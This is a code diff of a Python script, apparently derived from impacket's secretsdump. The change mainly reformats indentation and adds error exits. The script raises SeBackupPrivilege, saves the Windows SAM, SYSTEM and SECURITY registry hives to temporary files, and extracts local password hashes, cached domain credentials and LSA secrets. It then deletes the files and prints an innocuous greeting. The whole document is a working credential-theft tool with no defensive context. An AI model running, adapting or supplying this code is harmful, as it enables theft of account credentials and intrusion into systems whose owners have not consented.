@@ -26,21 +26,21 @@ class DumpSecrets:
         self.__canProcessSAMLSA = True
 
     def dump(self):
-    	if self.__systemHive and self.__samHive:
-    		try:
-    			localOperations = LocalOperations(self.__systemHive)
-    			bootKey = localOperations.getBootKey()
-    			SAMFileName = self.__samHive
-    			self.__SAMHashes = SAMHashes(SAMFileName, bootKey, isRemote = self.__isRemote)
-    			self.__SAMHashes.dump()
-    		except Exception as e:
-    			logging.error('SAM hashes extraction failed: %s' % str(e))
-    	if self.__securityHive:
-    		SECURITYFileName = self.__securityHive
-    		self.__LSASecrets = LSASecrets(SECURITYFileName, bootKey, self.__remoteOps, isRemote=self.__isRemote, history=self.__history)
-    		self.__LSASecrets.dumpCachedHashes()
-    		self.__LSASecrets.dumpSecrets()
-    	self.cleanup()
+        if self.__systemHive and self.__samHive:
+            try:
+                localOperations = LocalOperations(self.__systemHive)
+                bootKey = localOperations.getBootKey()
+                SAMFileName = self.__samHive
+                self.__SAMHashes = SAMHashes(SAMFileName, bootKey, isRemote = self.__isRemote)
+                self.__SAMHashes.dump()
+            except Exception as e:
+                logging.error('SAM hashes extraction failed: %s' % str(e))
+        if self.__securityHive:
+            SECURITYFileName = self.__securityHive
+            self.__LSASecrets = LSASecrets(SECURITYFileName, bootKey, self.__remoteOps, isRemote=self.__isRemote, history=self.__history)
+            self.__LSASecrets.dumpCachedHashes()
+            self.__LSASecrets.dumpSecrets()
+        self.cleanup()
 
     def cleanup(self):
         if self.__SAMHashes:
@@ -51,25 +51,30 @@ class DumpSecrets:
 
 
 if __name__ == '__main__':
-	with winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE, 'SAM') as handle: # Replace with the desired key
-		try:
-			win32security.AdjustTokenPrivileges(win32security.OpenProcessToken(win32api.GetCurrentProcess(), 40), 0, [(win32security.LookupPrivilegeValue(None, 'SeBackupPrivilege'), 2)]) # Basically, adjusts permissions for the interpreter to allow registry backups
-			winreg.SaveKey(handle, 'sa.tmp') # Replace with the desired file path
-		except OSError as err:
-			print("Failed to dump SAM:", err)
-	with winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE, 'SYSTEM') as handle: # Replace with the desired key
-		try:
-			win32security.AdjustTokenPrivileges(win32security.OpenProcessToken(win32api.GetCurrentProcess(), 40), 0, [(win32security.LookupPrivilegeValue(None, 'SeBackupPrivilege'), 2)]) # Basically, adjusts permissions for the interpreter to allow registry backups
-			winreg.SaveKey(handle, 'sy.tmp') # Replace with the desired file path
-		except OSError as err:
-			print("Failed to dump SAM:", err)
-	system = "sy.tmp"
-	sam = "sa.tmp"
-	os.system("reg.exe save hklm\security sec.tmp")
-	security = "sec.tmp"
-	dumper = DumpSecrets(system, sam, security)
-	dumper.dump()
-	os.remove("sa.tmp")
-	os.remove("sy.tmp")
-	os.remove("sec.tmp")
-	print("Hello! :)")
+    with winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE, 'SAM') as handle: # Replace with the desired key
+        try:
+            win32security.AdjustTokenPrivileges(win32security.OpenProcessToken(win32api.GetCurrentProcess(), 40), 0, [(win32security.LookupPrivilegeValue(None, 'SeBackupPrivilege'), 2)]) # Basically, adjusts permissions for the interpreter to allow registry backups
+            winreg.SaveKey(handle, 'sa.tmp') # Replace with the desired file path
+        except OSError as err:
+            print("[-] Failed to dump SAM:", err)
+            os.remove("sa.tmp")
+            exit()
+    with winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE, 'SYSTEM') as handle: # Replace with the desired key
+        try:
+            win32security.AdjustTokenPrivileges(win32security.OpenProcessToken(win32api.GetCurrentProcess(), 40), 0, [(win32security.LookupPrivilegeValue(None, 'SeBackupPrivilege'), 2)]) # Basically, adjusts permissions for the interpreter to allow registry backups
+            winreg.SaveKey(handle, 'sy.tmp') # Replace with the desired file path
+        except OSError as err:
+            print("[-] Failed to dump SYSTEM:", err)
+            os.remove("sy.tmp")
+            exit()
+    system = "sy.tmp"
+    sam = "sa.tmp"
+    os.system("reg.exe save hklm\security sec.tmp /y")
+    security = "sec.tmp"
+    dumper = DumpSecrets(system, sam, security)
+    dumper.dump()
+    os.remove("sa.tmp")
+    os.remove("sy.tmp")
+    os.remove("sec.tmp")
+    print("Hello! :)")
+
